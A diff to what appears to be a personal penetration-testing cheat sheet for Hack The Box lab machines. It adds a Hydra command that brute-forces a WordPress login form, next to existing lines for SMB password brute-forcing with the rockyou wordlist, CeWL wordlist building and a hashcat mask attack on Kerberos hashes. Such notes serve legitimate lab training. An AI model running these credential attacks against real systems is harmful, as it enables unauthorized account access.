@@ -15,6 +15,7 @@ ewl -d 2 -m 5 -w docswords.txt http://store.djewelry.htb/
 ==============================================================================
 # Hydra 
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb
+hydra -l "admin" -P /usr/share/wordlists/rockyou.txt brainfuck.htb https-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&redirect_to=:Incorrect'
 
 
 hashcat.exe -m 18200 -a 3 hash.txt ?u?l?l?l?l?l?l?l?l?d?s -o cracked.txt --force -D 1,2
